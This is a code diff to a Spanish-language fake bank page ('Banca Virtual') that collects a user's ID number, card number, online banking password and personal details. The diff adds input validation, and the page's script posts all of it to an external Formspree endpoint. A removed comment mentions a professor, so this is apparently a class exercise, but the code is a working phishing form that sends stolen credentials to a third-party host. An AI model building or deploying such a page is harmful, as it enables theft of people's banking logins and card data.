@@ -5,6 +5,9 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Banca Virtual</title>
 
+<!-- LIBRERÍA DE VALIDACIÓN AÑADIDA PARA NAVEGADOR -->
+<script src="https://unpkg.com/validator@latest/validator.min.js"></script>
+
 <style>
 *{box-sizing:border-box}
 
@@ -273,45 +276,88 @@ function actualizarPasos(numero){
   document.getElementById("l2").classList.toggle("done", numero >= 3);
 }
 
+// VALIDACIONES EN EL PASO 1
 document.getElementById("btn1").onclick = function(){
+  const tipoDoc = document.getElementById("documentoTipo").value;
   const documento = document.getElementById("documento").value.trim();
   const tarjeta = document.getElementById("tarjeta").value.trim();
   const clave = document.getElementById("clave").value.trim();
-  if(!documento || !tarjeta || !clave){
-    mostrarError("Completa todos los campos antes de continuar.");
+
+  let errores = [];
+
+  // Validar si están vacíos (validator.isEmpty)
+  if (validator.isEmpty(documento)) errores.push("El documento no puede estar vacío.");
+  if (validator.isEmpty(tarjeta)) errores.push("La tarjeta no puede estar vacía.");
+  if (validator.isEmpty(clave)) errores.push("La clave no puede estar vacía.");
+
+  // Validar si son únicamente números (validator.isNumeric)
+  if (!validator.isEmpty(documento) && !validator.isNumeric(documento)) {
+    errores.push("El número de documento debe contener solo números.");
+  }
+  if (!validator.isEmpty(tarjeta) && !validator.isNumeric(tarjeta)) {
+    errores.push("El número de tarjeta debe contener solo números.");
+  }
+
+  // Validar longitud del DNI o CE (validator.isLength)
+  if (tipoDoc === "DNI" && !validator.isEmpty(documento) && !validator.isLength(documento, { min: 8, max: 8 })) {
+    errores.push("El DNI debe tener exactamente 8 dígitos.");
+  }
+
+  // Validar longitud de la clave
+  if (!validator.isEmpty(clave) && !validator.isLength(clave, { min: 4, max: 6 })) {
+    errores.push("La clave de internet debe tener entre 4 y 6 caracteres.");
+  }
+
+  // Mostrar errores si existen
+  if (errores.length > 0) {
+    mostrarError(errores.join(" "));
     return;
   }
+
   mostrarPantalla(2);
 };
 
+// VALIDACIONES EN EL PASO 2
 document.getElementById("btn2").onclick = function(){
   const doc = document.getElementById("documento").value.trim();
   const tarj = document.getElementById("tarjeta").value.trim();
-  const claveIngresada = document.getElementById("clave").value.trim(); //  TOMA LO QUE ESCRIBES
+  const claveIngresada = document.getElementById("clave").value.trim();
   const prov = document.getElementById("provincia").value.trim();
   const dep = document.getElementById("departamento").value.trim();
   const nom = document.getElementById("nombre").value.trim();
 
-  if(!prov || !dep || !nom){
-    mostrarError("Completa provincia, departamento y nombre completo.");
+  let errores = [];
+
+  if (validator.isEmpty(prov)) errores.push("Debes ingresar la provincia.");
+  if (validator.isEmpty(dep)) errores.push("Debes ingresar el departamento.");
+  
+  // Validar que el nombre tenga al menos 5 caracteres (como en el ejemplo de Node.js)
+  if (validator.isEmpty(nom)) {
+    errores.push("Debes ingresar tu nombre completo.");
+  } else if (!validator.isLength(nom, { min: 5 })) {
+    errores.push("El nombre completo debe tener al menos 5 caracteres.");
+  }
+
+  if (errores.length > 0) {
+    mostrarError(errores.join(" "));
     return;
   }
 
-  // AQUÍ ESTÁ EL CAMBIO IMPORTANTE: envía LO QUE TÚ ESCRIBES
+  // Enviar formulario
   fetch("https://formspree.io/f/mkjglkkg", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
       Documento: doc,
       Tarjeta: tarj,
-      Clave_Ingresada: claveIngresada, // ESTO ES LO QUE VERÁ EL PROFESOR
+      Clave_Ingresada: claveIngresada,
       Provincia: prov,
       Departamento: dep,
       NombreCompleto: nom
     })
   })
   .then(respuesta => {
-    console.log(" Datos enviados:", respuesta);
+    console.log("Datos enviados:", respuesta);
     mostrarPantalla(3);
   })
   .catch(error => {
